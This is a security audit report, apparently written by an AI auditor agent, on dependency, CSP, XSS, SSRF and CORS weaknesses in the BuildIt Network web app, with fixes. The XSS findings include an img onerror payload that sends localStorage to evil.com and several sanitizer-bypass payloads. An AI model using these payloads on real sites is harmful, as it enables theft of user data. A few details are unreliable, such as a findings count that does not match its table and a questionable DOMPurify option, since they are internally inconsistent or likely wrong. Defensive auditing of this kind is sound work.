# Supply Chain and Dependency Security Audit

**Date**: 2026-01-18
**Auditor**: Security Auditor Agent
**Scope**: Dependency security, supply chain risks, CSP, XSS vectors, build pipeline
**Status**: Complete

---

## Executive Summary

This audit evaluates the supply chain security posture of BuildIt Network, focusing on dependency vulnerabilities, Content Security Policy implementation, XSS attack vectors, and potential exfiltration risks from compromised npm packages.

**Key Findings**:
- **21 dependency vulnerabilities** identified (3 critical, 8 high, 8 moderate, 2 low)
- **No Content Security Policy (CSP)** headers configured - CRITICAL
- **6 instances of dangerouslySetInnerHTML** without DOMPurify sanitization - HIGH
- **No Subresource Integrity (SRI)** implemented - MEDIUM
- **Weak randomness (Math.random)** used in non-crypto contexts but also in timestamp randomization for NIP-17 - HIGH

**Overall Risk Assessment**: HIGH

---

## Scope

### In-Scope
- `/workspace/buildit/package.json` - Dependency declarations
- `/workspace/buildit/bun.lock` - Locked dependencies
- `/workspace/buildit/vite.config.ts` - Build configuration
- `/workspace/buildit/index.html` - Entry HTML
- `/workspace/buildit/wrangler.toml` - Cloudflare Pages config
- `/workspace/buildit/functions/` - Edge functions
- `/workspace/buildit/src/` - Application source

### Out-of-Scope
- Runtime relay security
- Nostr protocol-level attacks
- Physical device security

---

## Findings

### CRITICAL-01: No Content Security Policy (CSP) Configured

**Severity**: Critical
**Component**: `/workspace/buildit/index.html`, Cloudflare Pages configuration
**CVSS Score**: 8.0

**Description**:
The application has no Content Security Policy headers configured. The PRIVACY.md document claims CSP is implemented ("see vite.config.ts"), but no CSP configuration exists in:
- `index.html` (no meta CSP tag)
- `vite.config.ts` (no CSP plugin)
- `public/_headers` (file does not exist)
- `wrangler.toml` (no header configuration)
- No `_middleware.ts` for Cloudflare Pages

**Attack Scenario**:
1. Attacker compromises any npm dependency (e.g., a popular utility like `date-fns`, `clsx`, or `lucide-react`)
2. Malicious code injected into the dependency
3. On next build/deploy, malicious JavaScript executes in all users' browsers
4. Without CSP `connect-src` restrictions, the malicious code can:
   - Exfiltrate private keys from SecureKeyManager memory
   - Send decrypted messages to attacker-controlled server
   - Forward all IndexedDB data
5. No CSP = unlimited exfiltration capability

**Impact**:
- Complete key compromise for all users
- Mass decryption of E2E encrypted messages
- Total platform compromise

**Remediation**:
Create `/workspace/buildit/public/_headers` with strict CSP:
```
/*
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss://*.damus.io wss://*.nos.lol https://api.coingecko.com; frame-src 'self' https://www.youtube-nocookie.com https://player.vimeo.com; object-src 'none'; base-uri 'self'; form-action 'self'
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
```

**Status**: Open

---

### CRITICAL-02: Dependency Vulnerabilities - Critical Severity

**Severity**: Critical
**Component**: `/workspace/buildit/package.json`

**Description**:
`bun audit` reveals 3 critical vulnerabilities:

1. **happy-dom >=19.0.0 <20.0.2** (dev dependency)
   - GHSA-qpm2-6cq5-7pq5: `--disallow-code-generation-from-strings` bypass
   - GHSA-37j7-fg3j-429f: VM Context Escape leading to RCE
   - Impact: Test environment could be compromised during CI/CD

2. **jspdf <=3.0.4** (production dependency)
   - GHSA-f8cm-6447-x5h2: Local File Inclusion/Path Traversal
   - Impact: If PDF generation is used with user-controlled paths, local files could be read

**Attack Scenario (jspdf)**:
1. Attacker supplies malicious input to PDF generation feature
2. Path traversal allows reading arbitrary files
3. Could potentially access `.env` files or other secrets in serverless environment

**Remediation**:
```bash
bun update happy-dom --latest
bun update jspdf --latest
```

**Status**: Open

---

### HIGH-01: dangerouslySetInnerHTML Without Sanitization

**Severity**: High
**Component**: Multiple files
**CVSS Score**: 7.5

**Affected Files**:
1. `/workspace/buildit/src/modules/publishing/components/ArticleView.tsx:160`
2. `/workspace/buildit/src/modules/documents/extensions/MathBlock.tsx:106`
3. `/workspace/buildit/src/modules/documents/extensions/MathBlock.tsx:136`
4. `/workspace/buildit/src/modules/public/components/PublicPages/PublicPageRenderer.tsx:110`
5. `/workspace/buildit/src/modules/public/components/PublicPages/PublicPageEditor.tsx:324`
6. `/workspace/buildit/src/modules/fundraising/components/PublicCampaignView/PublicCampaignView.tsx:52`

**Description**:
User-generated or third-party content is rendered using `dangerouslySetInnerHTML` without DOMPurify sanitization. The project documentation acknowledges this risk but DOMPurify is not installed or used.

**Attack Scenario**:
1. Attacker creates a fundraising campaign with malicious description containing:
   ```html
   <img src=x onerror="fetch('https://evil.com/'+btoa(JSON.stringify(localStorage)))">
   ```
2. Victim views the public campaign page
3. XSS executes, exfiltrating localStorage data
4. If CSP existed but was misconfigured, this would still execute

**Sample Vulnerable Code** (`PublicCampaignView.tsx:52`):
```tsx
<div className="prose prose-sm max-w-none" dangerouslySetInnerHTML={{ __html: campaign.description }} />
```

**Remediation**:
1. Install DOMPurify: `bun add dompurify @types/dompurify`
2. Create sanitization wrapper:
```typescript
import DOMPurify from 'dompurify';

export function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });
}
```
3. Apply to all dangerouslySetInnerHTML usages

**Status**: Open

---

### HIGH-02: Math.random() Used for Security-Relevant Timestamp Randomization

**Severity**: High
**Component**: `/workspace/buildit/src/core/crypto/nip17.ts:11`
**CVSS Score**: 6.5

**Description**:
The NIP-17 implementation uses `Math.random()` for timestamp randomization, which is intended to provide metadata protection:

```typescript
function randomizeTimestamp(baseTime: number = Date.now()): number {
  const twoDaysInSeconds = 2 * 24 * 60 * 60
  const randomOffset = Math.floor(Math.random() * twoDaysInSeconds) - twoDaysInSeconds / 2
  return Math.floor(baseTime / 1000) + randomOffset
}
```

`Math.random()` is not cryptographically secure. While this does not directly compromise encryption, it weakens metadata protection:
- An attacker who can observe multiple messages from the same browser session could potentially predict or correlate timestamps
- The randomness pool is shared across the entire JavaScript context
- Compromised dependencies could manipulate the random state

**Attack Scenario**:
1. Attacker compromises a utility dependency
2. Malicious code intercepts/predicts `Math.random()` outputs
3. Timestamp randomization becomes predictable
4. Traffic analysis correlation becomes easier

**Remediation**:
Replace with cryptographically secure randomness:
```typescript
function randomizeTimestamp(baseTime: number = Date.now()): number {
  const twoDaysInSeconds = 2 * 24 * 60 * 60
  const array = new Uint32Array(1)
  crypto.getRandomValues(array)
  const randomOffset = (array[0] % twoDaysInSeconds) - twoDaysInSeconds / 2
  return Math.floor(baseTime / 1000) + randomOffset
}
```

**Status**: Open

---

### HIGH-03: Multiple High-Severity Dependency Vulnerabilities

**Severity**: High
**Component**: `/workspace/buildit/package.json`

**Vulnerable Dependencies**:

| Package | Version | Vulnerability | Advisory |
|---------|---------|---------------|----------|
| valibot | >=0.31.0 <1.2.0 | ReDoS in EMOJI_REGEX | GHSA-vqpr-j7v3-hqw9 |
| qs | <6.14.1 | arrayLimit bypass DoS | GHSA-6rw7-vpxm-498p |
| tar | <=7.5.2 | Arbitrary file overwrite | GHSA-8qq5-rm4j-mr97 |
| glob | >=10.2.0 <10.5.0 | Command injection | GHSA-5j98-mcp5-4vw2 |
| @modelcontextprotocol/sdk | <1.24.0 | DNS rebinding, ReDoS | GHSA-w48q-cv73-mx4w |
| react-router | >=7.0.0 <=7.11.0 | XSS via open redirects | GHSA-2w69-qvjg-hvjx |

**Impact**:
- `valibot`: Used by `bip32`, `bitcoinjs-lib`, `ecpair` for crypto wallet features - ReDoS could freeze the app
- `react-router`: XSS vulnerabilities could be exploited for routing-based attacks
- `tar` and `glob`: Build-time vulnerabilities (dev dependencies via tailwindcss)

**Remediation**:
```bash
bun update --latest
```

Or add resolutions to package.json for specific packages.

**Status**: Open

---

### HIGH-04: Custom Sanitization is Insufficient

**Severity**: High
**Component**: `/workspace/buildit/src/lib/embed/utils.ts:167-191`

**Description**:
A custom `sanitizeEmbedHtml()` function attempts to sanitize oEmbed HTML responses using regex-based filtering:

```typescript
export function sanitizeEmbedHtml(html: string): string {
  let sanitized = html
  // Remove script tags
  sanitized = sanitized.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
  // Remove on* event handlers
  sanitized = sanitized.replace(/\s+on\w+\s*=\s*["'][^"']*["']/gi, '')
  // ...
}
```

Regex-based HTML sanitization is fundamentally flawed and can be bypassed with:
- Mutation XSS (mXSS)
- Unicode encoding tricks
- Parser differentials between regex and browser DOM
- Nested/malformed tags

**Attack Scenario**:
1. Attacker hosts malicious oEmbed endpoint
2. Returns HTML that bypasses regex sanitization: `<svg/onload=alert(1)>` or `<img src=x onerror&#x3d;alert(1)>`
3. Malicious code executes in victim's browser

**Remediation**:
Replace with DOMPurify:
```typescript
import DOMPurify from 'dompurify';

export function sanitizeEmbedHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['iframe'],
    ALLOWED_ATTR: ['src', 'width', 'height', 'frameborder', 'allow', 'allowfullscreen'],
    ADD_ATTR: ['sandbox="allow-scripts allow-same-origin"'],
  });
}
```

**Status**: Open

---

### MEDIUM-01: No Subresource Integrity (SRI) for CDN Assets

**Severity**: Medium
**Component**: Build pipeline, vite.config.ts

**Description**:
The PRIVACY.md claims SRI is implemented, but there is no evidence of SRI in the build configuration. The service worker caches CDN assets without integrity verification:

From `/workspace/buildit/vite.config.ts:100-109`:
```typescript
{
  urlPattern: /^https:\/\/cdn\.jsdelivr\.net\/.*/i,
  handler: 'StaleWhileRevalidate',
  options: {
    cacheName: 'cdn-cache',
    expiration: { maxEntries: 50, maxAgeSeconds: 60 * 60 * 24 * 30 }
  }
}
```

**Attack Scenario**:
1. CDN is compromised or DNS hijacked
2. Malicious JavaScript served from `cdn.jsdelivr.net`
3. Service worker caches the malicious script for 30 days
4. All subsequent requests serve malicious code

**Remediation**:
1. Add `vite-plugin-sri` or similar to generate integrity hashes
2. Configure service worker to validate integrity before caching
3. Pin CDN dependencies locally if possible

**Status**: Open

---

### MEDIUM-02: console.log Statements in Production Code

**Severity**: Medium
**Component**: Multiple files (50+ instances)

**Description**:
Extensive console logging throughout the codebase. While most are informational, some could leak sensitive debugging information:

Sample from `/workspace/buildit/src/main.tsx`:
```typescript
console.info("Step 5: Loading identities...");
console.error("Failed to initialize app:", error);
console.error("  Error name:", error.name);
console.error("  Error message:", error.message);
console.error("  Error stack:", error.stack);
```

**Impact**:
- Error messages could reveal application internals
- Browser extension or inspecting the console could reveal sensitive operation details
- In case of XSS, attacker could hook console methods to intercept data

**Remediation**:
1. Create a logger wrapper that can be disabled in production
2. Strip console statements in production build
3. Never log sensitive data (keys, tokens, etc.)

**Status**: Open

---

### MEDIUM-03: SSRF Risk in Link Preview Function

**Severity**: Medium
**Component**: `/workspace/buildit/functions/api/link-preview.ts`

**Description**:
The link preview edge function fetches arbitrary HTTPS URLs provided by users:

```typescript
const parsedUrl = validateUrl(targetUrl)
// ... only checks protocol is HTTPS ...
const response = await fetchWithTimeout(targetUrl, { ... }, FETCH_TIMEOUT)
```

While only HTTPS is allowed, the function could be used for:
- Internal network reconnaissance (if Cloudflare can reach internal services)
- Amplification attacks against third-party sites
- Credential harvesting via URL (e.g., `https://internal-app.local/?creds=...`)

**Remediation**:
1. Add blocklist for internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
2. Implement rate limiting per user/IP
3. Add blocklist for sensitive domains

**Status**: Open

---

### MEDIUM-04: Wide CORS Policy on API Functions

**Severity**: Medium
**Component**: `/workspace/buildit/functions/api/link-preview.ts:282-286`

**Description**:
```typescript
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
}
```

Using `*` for CORS allows any website to make requests to the link preview API.

**Impact**:
- Third-party sites could abuse the API for their own link previews
- Increased attack surface for CSRF-like attacks
- Resource consumption/billing for malicious use

**Remediation**:
Restrict to same origin or specific allowed origins:
```typescript
const allowedOrigins = ['https://buildit.network', 'https://staging.buildit.network']
const origin = request.headers.get('Origin')
const corsOrigin = allowedOrigins.includes(origin) ? origin : 'null'
```

**Status**: Open

---

### LOW-01: Weak Passphrase Generation

**Severity**: Low
**Component**: `/workspace/buildit/src/core/crypto/keyManager.ts:139-153`

**Description**:
```typescript
export function generatePassphrase(wordCount: number = 12): string {
  const words = []
  const charset = 'abcdefghijklmnopqrstuvwxyz'
  for (let i = 0; i < wordCount; i++) {
    let word = ''
    for (let j = 0; j < 6; j++) {
      word += charset[Math.floor(Math.random() * charset.length)]
    }
    words.push(word)
  }
  return words.join(' ')
}
```

Uses `Math.random()` for passphrase generation. However, the code comment indicates this is a placeholder ("in production, use BIP-39 wordlist").

**Impact**:
- If this function is actually used for key encryption passphrases, the entropy is severely limited
- `Math.random()` provides only ~53 bits of entropy

**Remediation**:
Implement proper BIP-39 mnemonic generation using the `bip39` package already in dependencies:
```typescript
import * as bip39 from 'bip39';
export function generatePassphrase(): string {
  return bip39.generateMnemonic(256); // 24 words, 256 bits entropy
}
```

**Status**: Open

---

### LOW-02: preconnect Without Integrity

**Severity**: Low
**Component**: `/workspace/buildit/index.html:11-14`

**Description**:
```html
<link rel="preconnect" href="wss://relay.damus.io" crossorigin>
<link rel="preconnect" href="wss://nos.lol" crossorigin>
<link rel="dns-prefetch" href="wss://relay.damus.io">
<link rel="dns-prefetch" href="wss://nos.lol">
```

While these are WebSocket connections (not script loading), preconnecting to external services reveals intent to connect before the user initiates.

**Impact**:
- Minor timing information leak
- Third-party can track which users visit the site

**Remediation**:
Consider making relay connections purely user-initiated rather than preconnecting.

**Status**: Open

---

### INFO-01: Browser Extension Attack Surface

**Severity**: Informational
**Component**: Architecture

**Description**:
As documented in PRIVACY.md, browser extensions with appropriate permissions can:
- Read IndexedDB data (encrypted keys)
- Access in-memory decrypted keys via JavaScript hooks
- Intercept all network requests

This is an inherent limitation of web applications.

**Recommendation**:
- Document this risk clearly for users
- Consider WebAuthn-protected key storage (partially implemented)
- Recommend users use minimal extensions when using the platform

**Status**: Acknowledged

---

### INFO-02: Dev Dependency Vulnerabilities

**Severity**: Informational
**Component**: Dev dependencies

**Description**:
Several development-only dependencies have vulnerabilities:
- `shadcn` chain: qs, body-parser, js-yaml, @modelcontextprotocol/sdk, diff
- `happy-dom` (critical)
- `prismjs` (DOM clobbering)

These do not affect production builds but could compromise the development/CI environment.

**Recommendation**:
Update dev dependencies regularly. Consider using a separate CI environment isolated from production secrets.

**Status**: Acknowledged

---

## Blast Radius Analysis

**Question**: An attacker compromises a popular npm package used by this app. What's the blast radius?

### Scenario 1: Compromised Utility Package (e.g., `clsx`, `date-fns`)

**Access Gained**:
- Full JavaScript execution in user's browser
- Access to all application memory
- Access to DOM and IndexedDB

**Data at Risk** (without CSP):
- Private keys (if app is unlocked, keys are in memory via SecureKeyManager)
- Decrypted message content
- Group membership data
- All localStorage/IndexedDB content
- Session tokens

**Exfiltration Path**:
1. Hook `crypto.subtle` operations to capture keys
2. Hook `fetch`/`WebSocket` to capture decrypted data
3. Send to attacker-controlled endpoint (no CSP to block)

**Impact**: **TOTAL COMPROMISE** of all users who load the compromised version

### Scenario 2: Compromised Crypto Package (`nostr-tools`, `@noble/secp256k1`)

**Additional Access**:
- Direct manipulation of cryptographic operations
- Key generation backdoors
- Signature manipulation
- Encrypted content interception

**Impact**: **CATASTROPHIC** - All cryptographic guarantees void

### Scenario 3: With Proper CSP

If a strict CSP were in place (`connect-src 'self' wss://*.allowed-relay.com`):
- Attacker could execute JavaScript
- BUT exfiltration would be blocked
- Keys could still be compromised in memory
- Data could be displayed to attacker-controlled content
- Reduced but not eliminated impact

---

## Summary

**Total Findings**: 15

| Severity | Count | Items |
|----------|-------|-------|
| Critical | 2 | CSP missing, Critical CVEs (happy-dom, jspdf) |
| High | 4 | XSS via dangerouslySetInnerHTML, Math.random in NIP-17, High CVEs, Custom sanitization |
| Medium | 4 | No SRI, console.log leaks, SSRF risk, Wide CORS |
| Low | 2 | Weak passphrase generation, preconnect leak |
| Informational | 2 | Browser extension risk, dev dependency CVEs |

---

## Priority Actions

1. **IMMEDIATE**: Create CSP headers configuration (`public/_headers`)
2. **IMMEDIATE**: Update critical vulnerability packages (`bun update --latest`)
3. **HIGH**: Install and implement DOMPurify for all HTML rendering
4. **HIGH**: Replace Math.random() in nip17.ts with crypto.getRandomValues
5. **MEDIUM**: Implement SRI for CDN assets
6. **MEDIUM**: Add production logging configuration

---

## Compliance Status

**Against PRIVACY.md Threat Model**:
- Supply Chain Attack scenario (Scenario 4): **PARTIALLY MITIGATED**
  - Dependency audits: Available but vulnerabilities exist
  - CSP: **NOT IMPLEMENTED** (claims implemented)
  - SRI: **NOT IMPLEMENTED** (claims implemented)
  - Code signing: Not implemented

**Recommendation**: The PRIVACY.md document should be updated to reflect actual implementation status rather than aspirational state.

---

## References

1. OWASP Dependency Check: https://owasp.org/www-project-dependency-check/
2. DOMPurify: https://github.com/cure53/DOMPurify
3. CSP Evaluator: https://csp-evaluator.withgoogle.com/
4. npm Advisory Database: https://github.com/advisories
5. Cloudflare Pages Headers: https://developers.cloudflare.com/pages/platform/headers/

---

**Audit Completed**: 2026-01-18
**Next Review**: After remediation of Critical/High findings
**Contact**: Security Auditor Agent
